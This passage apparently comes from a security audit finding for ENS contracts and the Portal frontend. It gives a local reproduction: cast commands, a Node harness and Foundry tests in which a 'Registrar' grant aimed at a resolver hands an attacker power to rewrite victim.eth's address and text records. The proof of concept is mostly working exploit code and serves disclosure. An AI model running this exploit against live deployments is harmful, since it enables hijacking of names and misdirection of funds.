  PORTAL_ROOT="${PORTAL_ROOT}" bash run_portal_harness.sh

export PORTAL_CALLDATA="$(jq -r \
  '.inputs.executedPrimaryEnsjsBuilderResult.calldata' \
  evidence/portal_builder.json)"
export VICTIM_NODE="$(cast namehash victim.eth)"

cast call "${PROXY}" 'hasRootRoles(uint256,address)(bool)' \
  1 "${ATTACKER}" --rpc-url "${LOCAL_RPC}"
cast call "${PROXY}" 'setAddr(bytes32,address)' \
  "${VICTIM_NODE}" "${ATTACKER}" --from "${ATTACKER}" \
  --rpc-url "${LOCAL_RPC}"

cast send "${PROXY}" --data "${PORTAL_CALLDATA}" \
  --private-key "${ANVIL_ADMIN_KEY}" --rpc-url "${LOCAL_RPC}" --json
cast send "${PROXY}" 'setAddr(bytes32,address)' \
  "${VICTIM_NODE}" "${ATTACKER}" \
  --private-key "${ANVIL_ATTACKER_KEY}" --rpc-url "${LOCAL_RPC}" --json

cast call "${PROXY}" 'hasRootRoles(uint256,address)(bool)' \
  1 "${ATTACKER}" --rpc-url "${LOCAL_RPC}"
cast call "${PROXY}" 'addr(bytes32)(address)' \
  "${VICTIM_NODE}" --rpc-url "${LOCAL_RPC}"

bash run_20_checks.sh
```

Expected state transition:

```text
before: attacker bit 0 = false; attacker setAddr reverts; addr = zero
grant:  grantRootRoles(1, attacker), local receipt status = 1
after:  attacker bit 0 = true as ROLE_SET_ADDR
exploit: attacker setAddr local receipt status = 1; addr = attacker
verifier: PASS receipt linkage 20/20
```
````

**Embedded file: `setup.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail

if [[ -z "${CONTRACTS_ROOT:-}" ]]; then
  echo "set CONTRACTS_ROOT to the contracts-v2 contracts/ directory" >&2
  exit 1
fi
if [[ -z "${PORTAL_ROOT:-}" ]]; then
  echo "set PORTAL_ROOT to the audit-comp-ens apps/portal directory" >&2
  exit 1
fi

required_files=(
  "${CONTRACTS_ROOT}/src/resolver/PermissionedResolver.sol"
  "${CONTRACTS_ROOT}/src/universalResolver/libraries/LibRegistry.sol"
  "${CONTRACTS_ROOT}/lib/verifiable-factory/src/VerifiableFactory.sol"
  "${PORTAL_ROOT}/src/routes/registry/\$address/roles.tsx"
  "${PORTAL_ROOT}/src/lib/roles/permissions.ts"
  "${PORTAL_ROOT}/node_modules/@ensdomains/ensjs/src/actions/wallet/v2/grantRoles.ts"
  "${PORTAL_ROOT}/node_modules/@ensdomains/ensjs/src/utils/v2/roles/registryRoles.ts"
  "${PORTAL_ROOT}/node_modules/vite/package.json"
)

for required_file in "${required_files[@]}"; do
  if [[ ! -f "${required_file}" ]]; then
    echo "missing required file: ${required_file}" >&2
    exit 1
  fi
done

portal_commit=$(git -C "${PORTAL_ROOT}" rev-parse HEAD)
contracts_commit=$(git -C "${CONTRACTS_ROOT}" rev-parse HEAD)
if [[ "${portal_commit}" != "1c9b47f18fcddd2e864dfe385c4171061c9811ae" ]]; then
  echo "unexpected Portal commit: ${portal_commit}" >&2
  exit 1
fi
if [[ "${contracts_commit}" != "48b3e2d39513b9dd32ef1850877a29009bc807b9" ]]; then
  echo "unexpected contracts-v2 commit: ${contracts_commit}" >&2
  exit 1
fi

sed -e "s|{{CONTRACTS_ROOT}}|${CONTRACTS_ROOT}|g" \
  foundry.toml.template > foundry.toml

echo "setup complete"
echo "Portal commit verified: ${portal_commit}"
echo "contracts-v2 commit verified: ${contracts_commit}"
```

**Embedded file: `foundry.toml.template`**

```toml
[profile.default]
src = "src"
test = "test"
out = "out"
cache_path = "cache"
libs = []
evm_version = "cancun"
optimizer = true
optimizer_runs = 200
auto_detect_remappings = false
remappings = [
  "target-src/={{CONTRACTS_ROOT}}/src/",
  "@openzeppelin/contracts/={{CONTRACTS_ROOT}}/lib/openzeppelin-contracts/contracts/",
  "@openzeppelin/contracts-upgradeable/={{CONTRACTS_ROOT}}/lib/openzeppelin-contracts-upgradeable/contracts/",
  "@openzeppelin/contracts-v5/={{CONTRACTS_ROOT}}/lib/openzeppelin-contracts/contracts/",
  "@ens/contracts/={{CONTRACTS_ROOT}}/lib/ens-contracts/contracts/",
  "@ensdomains/buffer/={{CONTRACTS_ROOT}}/lib/buffer/",
  "@ensdomains/verifiable-factory/={{CONTRACTS_ROOT}}/lib/verifiable-factory/src/",
  "@unruggable/gateways/={{CONTRACTS_ROOT}}/lib/unruggable-gateways/",
  "forge-std/={{CONTRACTS_ROOT}}/lib/forge-std/src/",
  "solady/={{CONTRACTS_ROOT}}/lib/solady/src/"
]

[lint]
lint_on_build = false
```

**Embedded file: `run_portal_harness.sh`**

```bash
#!/usr/bin/env bash
set -euo pipefail

if [[ -z "${PORTAL_ROOT:-}" ]]; then
  echo "set PORTAL_ROOT to the audit-comp-ens apps/portal directory" >&2
  exit 1
fi

target=${TARGET:-0xe17482932D009e08429BEb786Ca4EC4490A4743D}
caller=${CALLER:-0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266}
attacker=${ATTACKER:-0x70997970C51812dc3A010C7d01b50e0d17dc79C8}
vite_package=$(realpath "${PORTAL_ROOT}/node_modules/vite/package.json")

node portal_route_harness.mjs \
  --route "${PORTAL_ROOT}/src/routes/registry/\$address/roles.tsx" \
  --permissions "${PORTAL_ROOT}/src/lib/roles/permissions.ts" \
  --registry-roles "${PORTAL_ROOT}/node_modules/@ensdomains/ensjs/src/utils/v2/roles/registryRoles.ts" \
  --grant-roles "${PORTAL_ROOT}/node_modules/@ensdomains/ensjs/src/actions/wallet/v2/grantRoles.ts" \
  --vite-package "${vite_package}" \
  --out evidence/portal_builder.json \
  --target "${target}" \
  --caller "${caller}" \
  --attacker "${attacker}"
```

**Embedded file: `portal_route_harness.mjs`**

```javascript
#!/usr/bin/env node

import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs'
import { createRequire } from 'node:module'
import { dirname, resolve } from 'node:path'

const expectedHashes = {
  route: 'c871a98f09ebb8d9f6e578a51e658feddd0adf81fff79c9662190be291abbf08',
  permissions: '26c464da1f71c2f940300f303550f28797322410b545f17ff5ee4237bc24a884',
  registryRoles: '074ae91b400735dcde824585cea7386bea3c700be27a8f88c1ed292b08e3d895',
  grantRoles: '19611dc48504fe51b94c68e9c41145a7159bf371c13a73b4d75dda65dc59da26',
}

function parseArgs(argv) {
  const args = {}
  const pathArgs = new Set([
    'route',
    'permissions',
    'registry-roles',
    'grant-roles',
    'vite-package',
    'out',
  ])
  for (let index = 0; index < argv.length; index += 2) {
    const key = argv[index]
    const value = argv[index + 1]
    if (!key?.startsWith('--') || value === undefined) {
      throw new Error(`Invalid argument sequence at ${key ?? '<end>'}`)
    }
    const name = key.slice(2)
    args[name] = pathArgs.has(name) ? resolve(value) : value
  }
  for (const required of [
    'route',
    'permissions',
    'registry-roles',
    'grant-roles',
    'vite-package',
    'out',
  ]) {
    if (!args[required]) throw new Error(`Missing --${required}`)
  }
  return args
}

function sha256(bytes) {
  return createHash('sha256').update(bytes).digest('hex')
}

function verifiedRead(path, expectedHash) {
  const bytes = readFileSync(path)
  const actualHash = sha256(bytes)
  assert.equal(actualHash, expectedHash, `SHA-256 mismatch for ${path}`)
  return { text: bytes.toString('utf8'), sha256: actualHash }
}

const args = parseArgs(process.argv.slice(2))
const routeSource = verifiedRead(args.route, expectedHashes.route)
const permissionsSource = verifiedRead(args.permissions, expectedHashes.permissions)
const registryRolesSource = verifiedRead(
  args['registry-roles'],
  expectedHashes.registryRoles,
)
const grantRolesSource = verifiedRead(args['grant-roles'], expectedHashes.grantRoles)

assert.match(
  permissionsSource.text,
  /key:\s*'ROLE_REGISTER_RESERVED'[\s\S]*?title:\s*'Register Reserved'/,
)
assert.match(
  permissionsSource.text,
  /key:\s*'ROLE_REGISTRAR'[\s\S]*?title:\s*'Registrar'[\s\S]*?description:\s*'Can register new labels'/,
)
assert.match(
  registryRolesSource.text,
  /const ROLE_REGISTER_RESERVED = 1n << 4n/,
)
assert.match(registryRolesSource.text, /const ROLE_REGISTRAR = 1n << 0n/)
assert.match(grantRolesSource.text, /functionName:\s*'grantRootRoles'/)
assert.match(grantRolesSource.text, /args:\s*\[roleBitmap, account\]/)

const viteRequire = createRequire(args['vite-package'])
const esbuild = viteRequire('esbuild')

const stubModules = {
  react: `exports.useState = (initial) => [initial, () => {}]`,
  'react/jsx-runtime': `
    const make = (type, props, key) => ({
      __testNode: true,
      type: typeof type === 'string' ? type : (type && (type.displayName || type.name)) || 'Anonymous',
      props: props || {},
      key: key ?? null,
    });
    exports.Fragment = 'Fragment';
    exports.jsx = make;
    exports.jsxs = make;
  `,
  '@tanstack/react-query': `
    exports.useQuery = (options) => {
      const scenario = globalThis.__portalRouteScenario;
      if (options && options.__queryKind === 'registryInfo') {
        return { data: scenario.registry, isLoading: false, error: null };
      }
      if (options && options.__queryKind === 'hasRoles') {
        return { data: scenario.isAdmin, isLoading: false, error: null };
      }
      throw new Error('Unexpected query options: ' + JSON.stringify(options));
    };
  `,
  '@tanstack/react-router': `
    exports.createFileRoute = (routePath) => (config) => Object.assign({}, config, {
      routePath,
      useParams: () => globalThis.__portalRouteScenario.params,
    });
  `,
  'lucide-react': `exports.Plus = 'Plus'`,
  viem: `exports.zeroAddress = '0x0000000000000000000000000000000000000000'`,
  wagmi: `
    exports.useWalletClient = () => ({
      data: { account: { address: globalThis.__portalRouteScenario.caller } },
    });
  `,
  '@/components/ErrorMessage': `exports.ErrorMessage = 'ErrorMessage'`,
  '@/components/LoadingSpinner': `exports.LoadingSpinner = 'LoadingSpinner'`,
  '@/components/NotFoundMessage': `exports.NotFoundMessage = 'NotFoundMessage'`,
  '@/components/ui/button': `exports.Button = 'Button'`,
  '@/features/registry/components/v2/RegistryAddUserSheet':
    `exports.RegistryAddUserSheet = 'RegistryAddUserSheet'`,
  '@/features/registry/components/v2/RegistryRolesTable':
    `exports.RegistryRolesTable = 'RegistryRolesTable'`,
  '@/features/registry/hooks/useHasRoles': `
    exports.getHasRolesQueryOptions = (params) => ({ __queryKind: 'hasRoles', params });
  `,
  '@/features/registry/hooks/useRegistry': `
    exports.getRegistryInfoQueryOptions = (params) => ({ __queryKind: 'registryInfo', params });
  `,
  '@/utils/formatting/truncateAddress': `
    exports.truncateAddress = (address) => address.slice(0, 8) + '...' + address.slice(-4);
  `,
}

const stubPlugin = {
  name: 'bounded-route-stubs',
  setup(build) {
    build.onResolve({ filter: /.*/ }, (request) => {
      if (request.kind === 'entry-point') return null
      if (!(request.path in stubModules)) {
        throw new Error(`Unexpected import from target route: ${request.path}`)
      }
      return { path: request.path, namespace: 'bounded-stub' }
    })
    build.onLoad({ filter: /.*/, namespace: 'bounded-stub' }, (request) => ({
      contents: stubModules[request.path],
      loader: 'js',
    }))
  },
}

const buildResult = await esbuild.build({
  entryPoints: [args.route],
  bundle: true,
  format: 'cjs',
  platform: 'node',
  target: 'node22',
  write: false,
  plugins: [stubPlugin],
  logLevel: 'silent',
})

assert.equal(buildResult.outputFiles.length, 1)
const bundledCode = buildResult.outputFiles[0].text
const targetModule = { exports: {} }
new Function('module', 'exports', bundledCode)(targetModule, targetModule.exports)
const { Route } = targetModule.exports
assert.equal(Route.routePath, '/registry/$address/roles')

const ensjsBuildResult = await esbuild.build({
  entryPoints: [args['grant-roles']],
  bundle: true,
  format: 'cjs',
  platform: 'node',
  target: 'node22',
  write: false,
  logLevel: 'silent',
})
assert.equal(ensjsBuildResult.outputFiles.length, 1)
const ensjsModule = { exports: {} }
new Function('module', 'exports', ensjsBuildResult.outputFiles[0].text)(
  ensjsModule,
  ensjsModule.exports,
)
const ensjsRequire = createRequire(args['grant-roles'])
const { encodeFunctionData } = ensjsRequire('viem')

function flatten(node, output = []) {
  if (Array.isArray(node)) {
    for (const child of node) flatten(child, output)
    return output
  }
  if (!node || typeof node !== 'object') return output
  if (node.__testNode) output.push(node)
  flatten(node.props?.children, output)
  return output
}

function runScenario(scenario) {
  globalThis.__portalRouteScenario = scenario
  const tree = Route.component()
  const nodes = flatten(tree)
  const types = nodes.map((node) => node.type)
  const text = nodes
    .flatMap((node) => {
      const children = node.props?.children
      return Array.isArray(children) ? children : [children]
    })
    .filter((item) => typeof item === 'string')
  const table = nodes.find((node) => node.type === 'RegistryRolesTable')
  const sheet = nodes.find((node) => node.type === 'RegistryAddUserSheet')
  return {
    types,
    text,
    tableAddress: table?.props?.address ?? null,
    sheetAddress: sheet?.props?.registryAddress ?? null,
  }
}

const target = args.target ?? '0xa9a5c3bf02eac02ac6e0e5e4ecb5ea3e4d631308'
const victim = args.caller ?? '0xcf8d3063e7074b38f4548a7e2798ce2d498a8ee2'
const attacker = args.attacker ?? '0x70997970c51812dc3a010c7d01b50e0d17dc79c8'
const base = { params: { address: target }, caller: victim }

const encodedPrimaryGrant = ensjsModule.exports.grantRolesWriteParameters(
  { account: { address: victim }, chain: { id: 31337 } },
  {
    registryAddress: target,
    roles: ['ROLE_REGISTRAR'],
    account: attacker,
    resource: 0n,
  },
)
assert.equal(encodedPrimaryGrant.address, target)
assert.equal(encodedPrimaryGrant.functionName, 'grantRootRoles')
assert.equal(encodedPrimaryGrant.args[0], 1n)
assert.equal(encodedPrimaryGrant.args[1], attacker)
const encodedPrimaryCalldata = encodeFunctionData({
  abi: encodedPrimaryGrant.abi,
  functionName: encodedPrimaryGrant.functionName,
  args: encodedPrimaryGrant.args,
})
assert(encodedPrimaryCalldata.startsWith('0x072d5d77'))

const encodedAlternateGrant = ensjsModule.exports.grantRolesWriteParameters(
  { account: { address: victim }, chain: { id: 11155111 } },
  {
    registryAddress: target,
    roles: ['ROLE_REGISTER_RESERVED'],
    account: attacker,
    resource: 0n,
  },
)
assert.equal(encodedAlternateGrant.address, target)
assert.equal(encodedAlternateGrant.functionName, 'grantRootRoles')
assert.equal(encodedAlternateGrant.args[0], 16n)
assert.equal(encodedAlternateGrant.args[1], attacker)

const beforeMaterialization = runScenario({
  ...base,
  registry: null,
  isAdmin: true,
})
const afterMaterializationAdmin = runScenario({
  ...base,
  registry: {
    address: target,
    name: 'decoy.eth',
    namehash: `0x${'11'.repeat(32)}`,
    parentRegistry: '0x0000000000000000000000000000000000000000',
    createdBlock: 11600069,
    createdAt: 0,
    labelCount: 0,
    roleCount: 1,
    eventCount: 1,
    referencedBy: [{ name: 'decoy.eth' }],
  },
  isAdmin: true,
})
const afterMaterializationNonAdmin = runScenario({
  ...base,
  registry: afterMaterializationAdmin ? { address: target } : null,
  isAdmin: false,
})

assert(beforeMaterialization.types.includes('NotFoundMessage'))
assert(!beforeMaterialization.types.includes('Button'))
assert(afterMaterializationAdmin.types.includes('Button'))
assert(afterMaterializationAdmin.text.includes('Add User'))
assert.equal(afterMaterializationAdmin.tableAddress, target)
assert.equal(afterMaterializationAdmin.sheetAddress, target)
assert(!afterMaterializationNonAdmin.types.includes('Button'))
assert(!afterMaterializationNonAdmin.types.includes('RegistryAddUserSheet'))

const evidence = {
  schema: 'm06_direct_registry_route_experiment_v1',
  verdict: 'PASS',
  versions: {
    node: process.version,
    esbuild: esbuild.version,
    portalCommit: '1c9b47f18fcddd2e864dfe385c4171061c9811ae',
    ensjs: '5.0.0-alpha.1',
  },
  verifiedSources: {
    route: {
      path: 'apps/portal/src/routes/registry/$address/roles.tsx',
      sha256: routeSource.sha256,
    },
    permissions: {
      path: 'apps/portal/src/lib/roles/permissions.ts',
      sha256: permissionsSource.sha256,
    },
    registryRoles: {
      path: 'apps/portal/node_modules/@ensdomains/ensjs/src/utils/v2/roles/registryRoles.ts',
      sha256: registryRolesSource.sha256,
    },
    grantRoles: {
      path: 'apps/portal/node_modules/@ensdomains/ensjs/src/actions/wallet/v2/grantRoles.ts',
      sha256: grantRolesSource.sha256,
    },
  },
  inputs: {
    directPath: `/registry/${target}/roles`,
    target,
    caller: victim,
    materializedRegistryRow: afterMaterializationAdmin.tableAddress === target,
    primaryDisplayedRole: 'ROLE_REGISTRAR / Registrar / Can register new labels',
    primaryRegistryBitmap: '1',
    executedPrimaryEnsjsBuilderResult: {
      address: encodedPrimaryGrant.address,
      functionName: encodedPrimaryGrant.functionName,
      args: [encodedPrimaryGrant.args[0].toString(), encodedPrimaryGrant.args[1]],
      calldata: encodedPrimaryCalldata,
    },
    alternateDisplayedRole: 'ROLE_REGISTER_RESERVED / Register Reserved',
    alternateRegistryBitmap: '16',
    rootGrantFunction: 'grantRootRoles',
    executedEnsjsBuilderResult: {
      address: encodedAlternateGrant.address,
      functionName: encodedAlternateGrant.functionName,
      args: [encodedAlternateGrant.args[0].toString(), encodedAlternateGrant.args[1]],
    },
  },
  outputs: {
    beforeMaterialization,
    afterMaterializationAdmin,
    afterMaterializationNonAdmin,
  },
  conclusions: {
    directNavigationNeedsNoNameRolesViewAfterMaterialization: true,
    materializedRowIsTheOnlyRegistryTypeGateInThisComponent: true,
    adminStateEnablesAddUserForTheBareRouteAddress: true,
    nonAdminStateSuppressesAddUser: true,
    portalDisplaysRegistrarAsCanRegisterNewLabels: true,
    ensjsBuilderExecutedRegistrarAsBit0RootGrant: true,
    portalOffersAlternateRegisterReservedRole: true,
    ensjsBuilderExecutedAlternateRoleAsBit4RootGrant: true,
  },
  limits: [
    'Component-level execution with injected query results; no browser, wallet, or live indexer was used.',
    'The experiment validates the direct route decision after materialization, not how a production indexer materializes the row.',
    'No public chain endpoint was contacted.',
  ],
}

mkdirSync(dirname(args.out), { recursive: true })
writeFileSync(args.out, `${JSON.stringify(evidence, null, 2)}\n`)
console.log(JSON.stringify(evidence, null, 2))
```

**Embedded file: `ensjs/grantRoles.ts`**

```typescript
import {
  eacGrantRolesSnippet,
  eacGrantRootRolesSnippet,
} from '@ensdomains/ensjs-abi/v2/enhancedAccessControl'
import type {
  Account,
  Address,
  Chain,
  Client,
  Transport,
  WriteContractParameters,
} from 'viem'
import { ASSERT_NO_TYPE_ERROR } from '../../../types/internal.js'
import {
  encodeRoleBitmap,
  type Role,
} from '../../../utils/v2/roles/encodeRoleBitmap.js'

export type GrantRolesWriteParametersParameters = {
  registryAddress: Address
  roles: Role[]
  account: Address
  resource: bigint
}

export const grantRolesWriteParameters = <
  chain extends Chain,
  account extends Account,
>(
  client: Client<Transport, chain, account>,
  {
    registryAddress,
    roles,
    account,
    resource,
  }: GrantRolesWriteParametersParameters,
) => {
  ASSERT_NO_TYPE_ERROR(client)

  const isRootResource = resource === 0n
  const roleBitmap = encodeRoleBitmap(roles)

  // ROOT_RESOURCE grants must use the dedicated `grantRootRoles` entrypoint;
  // the general `grantRoles` reverts with `EACRootResourceNotAllowed`. Mirrors
  // `revokeRolesWriteParameters`.
  if (isRootResource) {
    return {
      address: registryAddress,
      functionName: 'grantRootRoles',
      abi: eacGrantRootRolesSnippet,
      chain: client.chain,
      account: client.account,
      args: [roleBitmap, account] as const,
    } as const satisfies WriteContractParameters<
      typeof eacGrantRootRolesSnippet
    >
  }

  return {
    address: registryAddress,
    functionName: 'grantRoles',
    abi: eacGrantRolesSnippet,
    chain: client.chain,
    account: client.account,
    args: [resource, roleBitmap, account] as const,
  } as const satisfies WriteContractParameters<typeof eacGrantRolesSnippet>
}
```

**Embedded file: `ensjs/registryRoles.ts`**

```typescript
/** Nybble 0 — authorizes registering and reserving new names. Root only. */
const ROLE_REGISTRAR = 1n << 0n
const ROLE_REGISTRAR_ADMIN = ROLE_REGISTRAR << 128n

/** Nybble 1 — authorizes registering a reserved name. Root only. */
const ROLE_REGISTER_RESERVED = 1n << 4n
const ROLE_REGISTER_RESERVED_ADMIN = ROLE_REGISTER_RESERVED << 128n

/** Nybble 2 — authorizes setting the parent registry. Root only. */
const ROLE_SET_PARENT = 1n << 8n
const ROLE_SET_PARENT_ADMIN = ROLE_SET_PARENT << 128n

/** Nybble 3 — authorizes unregistering names. Root or token. */
const ROLE_UNREGISTER = 1n << 12n
const ROLE_UNREGISTER_ADMIN = ROLE_UNREGISTER << 128n

/** Nybble 4 — authorizes extending name expiry. Root or token. */
const ROLE_RENEW = 1n << 16n
const ROLE_RENEW_ADMIN = ROLE_RENEW << 128n

/** Nybble 5 — authorizes changing a name's child registry. Root or token. */
const ROLE_SET_SUBREGISTRY = 1n << 20n
const ROLE_SET_SUBREGISTRY_ADMIN = ROLE_SET_SUBREGISTRY << 128n

/** Nybble 6 — authorizes changing a name's resolver. Root or token. */
const ROLE_SET_RESOLVER = 1n << 24n
const ROLE_SET_RESOLVER_ADMIN = ROLE_SET_RESOLVER << 128n

/** Nybble 7 — authorizes ERC1155 token transfers. Admin-only (checked on token owner). */
const ROLE_CAN_TRANSFER_ADMIN = (1n << 28n) << 128n

/**
 * Nybble 8 — tags a name that was registered via `ROLE_REGISTER_RESERVED`. Token-only.
 * Not revocable. Useful for indexers to identify pre-migrated names.
 */
const ROLE_WAS_RESERVED = 1n << 32n

/** Nybble 9 — authorizes setting the registry metadata URI. Root only. */
const ROLE_SET_URI = 1n << 36n
const ROLE_SET_URI_ADMIN = ROLE_SET_URI << 128n

/** Nybble 31 — authorizes UUPS proxy upgrades. Root only. */
const ROLE_UPGRADE = 1n << 124n
const ROLE_UPGRADE_ADMIN = ROLE_UPGRADE << 128n

export {
  ROLE_CAN_TRANSFER_ADMIN,
  ROLE_REGISTER_RESERVED,
  ROLE_REGISTER_RESERVED_ADMIN,
  ROLE_REGISTRAR,
  ROLE_REGISTRAR_ADMIN,
  ROLE_RENEW,
  ROLE_RENEW_ADMIN,
  ROLE_SET_PARENT,
  ROLE_SET_PARENT_ADMIN,
  ROLE_SET_RESOLVER,
  ROLE_SET_RESOLVER_ADMIN,
  ROLE_SET_SUBREGISTRY,
  ROLE_SET_SUBREGISTRY_ADMIN,
  ROLE_SET_URI,
  ROLE_SET_URI_ADMIN,
  ROLE_UNREGISTER,
  ROLE_UNREGISTER_ADMIN,
  ROLE_UPGRADE,
  ROLE_UPGRADE_ADMIN,
  ROLE_WAS_RESERVED,
}
```

**Embedded file: `test/ExecutedRouteSearch.t.sol`**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";

import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {VerifiableFactory} from "@ensdomains/verifiable-factory/VerifiableFactory.sol";

import {IEnhancedAccessControl} from "target-src/access-control/interfaces/IEnhancedAccessControl.sol";
import {IRegistry} from "target-src/registry/interfaces/IRegistry.sol";
import {RegistryRolesLib} from "target-src/registry/libraries/RegistryRolesLib.sol";
import {PermissionedResolver} from "target-src/resolver/PermissionedResolver.sol";
import {PermissionedResolverLib} from "target-src/resolver/libraries/PermissionedResolverLib.sol";
import {LibRegistry} from "target-src/universalResolver/libraries/LibRegistry.sol";

contract LocalRegistry is IRegistry {
    mapping(bytes32 labelHash => IRegistry registry) private _subregistries;
    mapping(bytes32 labelHash => address resolver) private _resolvers;

    function setSubregistry(string calldata label, IRegistry registry) external {
        _subregistries[keccak256(bytes(label))] = registry;
    }

    function setResolver(string calldata label, address resolver) external {
        _resolvers[keccak256(bytes(label))] = resolver;
    }

    function getSubregistry(string calldata label) external view returns (IRegistry) {
        return _subregistries[keccak256(bytes(label))];
    }

    function getResolver(string calldata label) external view returns (address) {
        return _resolvers[keccak256(bytes(label))];
    }

    function getParent() external pure returns (IRegistry parent, string memory label) {
        return (IRegistry(address(0)), "");
    }
}

contract RegistryDiscoveryProbe {
    function find(IRegistry root, bytes calldata name) external view returns (address[] memory addresses) {
        IRegistry[] memory registries = LibRegistry.findRegistries(root, name, 0);
        addresses = new address[](registries.length);
        for (uint256 i; i < registries.length; ++i) {
            addresses[i] = address(registries[i]);
        }
    }
}

contract ExecutedRouteSearchTest is Test {
    address private attacker;

    function setUp() external {
        attacker = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    }

    function testResolverOnlyVersusSubregistryDrivenDiscovery() external {
        bytes memory decoyName = NameCoder.encode("decoy.eth");
        RegistryDiscoveryProbe probe = new RegistryDiscoveryProbe();
        LocalRegistry target = new LocalRegistry();

        LocalRegistry resolverOnlyRoot = new LocalRegistry();
        LocalRegistry resolverOnlyEth = new LocalRegistry();
        resolverOnlyRoot.setSubregistry("eth", resolverOnlyEth);
        resolverOnlyEth.setResolver("decoy", address(target));

        address[] memory resolverOnly = probe.find(resolverOnlyRoot, decoyName);
        assertEq(resolverOnly.length, 3, "resolver-only result length");
        assertEq(resolverOnly[0], address(0), "resolver-only leaf must not be a registry");
        assertEq(resolverOnly[1], address(resolverOnlyEth), "resolver-only eth registry");
        assertEq(resolverOnly[2], address(resolverOnlyRoot), "resolver-only root registry");

        LocalRegistry subregistryRoot = new LocalRegistry();
        LocalRegistry subregistryEth = new LocalRegistry();
        subregistryRoot.setSubregistry("eth", subregistryEth);
        subregistryEth.setSubregistry("decoy", target);

        address[] memory subregistryDriven = probe.find(subregistryRoot, decoyName);
        assertEq(subregistryDriven.length, 3, "subregistry result length");
        assertEq(subregistryDriven[0], address(target), "subregistry leaf must be returned");
        assertEq(subregistryDriven[1], address(subregistryEth), "subregistry eth registry");
        assertEq(subregistryDriven[2], address(subregistryRoot), "subregistry root registry");

        emit log_named_address("resolver-only leaf", resolverOnly[0]);
        emit log_named_address("resolver-only resolver target", address(target));
        emit log_named_address("subregistry-driven leaf", subregistryDriven[0]);
        emit log_named_uint("resolver-only leaf reachable", resolverOnly[0] == address(target) ? 1 : 0);
        emit log_named_uint("subregistry-driven leaf reachable", subregistryDriven[0] == address(target) ? 1 : 0);
    }

    function testAlternateRegisterReservedBitBecomesGlobalSetText() external {
        VerifiableFactory factory = new VerifiableFactory();
        PermissionedResolver implementation = new PermissionedResolver(address(this));
        uint256 adminRoles = PermissionedResolverLib.ROLE_SET_TEXT_ADMIN;
        bytes memory initData =
            abi.encodeCall(PermissionedResolver.initialize, (address(this), adminRoles, new bytes[](0)));
        PermissionedResolver resolver =
            PermissionedResolver(factory.deployProxy(address(implementation), uint256(keccak256(initData)), initData));

        bytes memory victimName = NameCoder.encode("victim.eth");
        bytes32 victimNode = NameCoder.namehash(victimName, 0);
        string memory key = "url";
        string memory attackerValue = "https://attacker.invalid";

        vm.expectRevert();
        vm.prank(attacker);
        resolver.setText(victimNode, key, attackerValue);

        uint256 displayedRegistryRole = RegistryRolesLib.ROLE_REGISTER_RESERVED;
        uint256 executedResolverRole = PermissionedResolverLib.ROLE_SET_TEXT;
        assertEq(displayedRegistryRole, 16, "Registry ROLE_REGISTER_RESERVED bitmap");
        assertEq(executedResolverRole, 16, "Resolver ROLE_SET_TEXT bitmap");
        assertEq(displayedRegistryRole, executedResolverRole, "same bitmap must collide");

        bytes memory portalLikeCalldata =
            abi.encodeCall(IEnhancedAccessControl.grantRootRoles, (displayedRegistryRole, attacker));
        assertEq(
            IEnhancedAccessControl.grantRootRoles.selector,
            bytes4(keccak256("grantRootRoles(uint256,address)")),
            "shared selector"
        );

        (bool granted, bytes memory returnData) = address(resolver).call(portalLikeCalldata);
        assertTrue(granted, "grantRootRoles call");
        assertTrue(abi.decode(returnData, (bool)), "grantRootRoles return value");
        assertTrue(
            resolver.hasRootRoles(PermissionedResolverLib.ROLE_SET_TEXT, attacker),
            "attacker must gain resolver ROLE_SET_TEXT"
        );

        vm.prank(attacker);
        resolver.setText(victimNode, key, attackerValue);
        assertEq(resolver.text(victimNode, key), attackerValue, "attacker text write");

        emit log_named_uint("Portal Registry ROLE_REGISTER_RESERVED bitmap", displayedRegistryRole);
        emit log_named_uint("PermissionedResolver ROLE_SET_TEXT bitmap", executedResolverRole);
        emit log_named_bytes32("grantRootRoles selector", bytes32(IEnhancedAccessControl.grantRootRoles.selector));
        emit log_named_bytes("portal-like calldata", portalLikeCalldata);
        emit log_named_uint(
            "attacker has root ROLE_SET_TEXT",
            resolver.hasRootRoles(PermissionedResolverLib.ROLE_SET_TEXT, attacker) ? 1 : 0
        );
        emit log_named_string("written text value", resolver.text(victimNode, key));
    }

    function testDirectRegistrarBitBecomesGlobalSetAddr() external {
        VerifiableFactory factory = new VerifiableFactory();
        PermissionedResolver implementation = new PermissionedResolver(address(this));
        uint256 adminRoles = PermissionedResolverLib.ROLE_SET_ADDR_ADMIN;
        bytes memory initData =
            abi.encodeCall(PermissionedResolver.initialize, (address(this), adminRoles, new bytes[](0)));
        PermissionedResolver resolver = PermissionedResolver(
            factory.deployProxy(address(implementation), uint256(keccak256("direct-registrar-bit0")), initData)
        );

        bytes memory victimName = NameCoder.encode("victim.eth");
        bytes32 victimNode = NameCoder.namehash(victimName, 0);
        address beforeAddress = resolver.addr(victimNode);
        assertEq(beforeAddress, address(0), "initial resolver answer");

        vm.expectRevert();
        vm.prank(attacker);
        resolver.setAddr(victimNode, attacker);

        uint256 displayedRegistryRole = RegistryRolesLib.ROLE_REGISTRAR;
        uint256 executedResolverRole = PermissionedResolverLib.ROLE_SET_ADDR;
        assertEq(displayedRegistryRole, 1, "Registry ROLE_REGISTRAR bitmap");
        assertEq(executedResolverRole, 1, "Resolver ROLE_SET_ADDR bitmap");
        assertEq(displayedRegistryRole, executedResolverRole, "same-impact bitmap collision");

        bytes memory portalCalldata =
            abi.encodeCall(IEnhancedAccessControl.grantRootRoles, (displayedRegistryRole, attacker));
        (bool granted, bytes memory returnData) = address(resolver).call(portalCalldata);
        assertTrue(granted, "grantRootRoles call");
        assertTrue(abi.decode(returnData, (bool)), "grantRootRoles return value");
        assertTrue(
            resolver.hasRootRoles(PermissionedResolverLib.ROLE_SET_ADDR, attacker),
            "attacker must gain resolver ROLE_SET_ADDR"
        );

        vm.prank(attacker);
        resolver.setAddr(victimNode, attacker);
        address afterAddress = resolver.addr(victimNode);
        assertEq(afterAddress, attacker, "resolver output after attacker write");

        emit log_named_uint("Portal Registry ROLE_REGISTRAR bitmap", displayedRegistryRole);
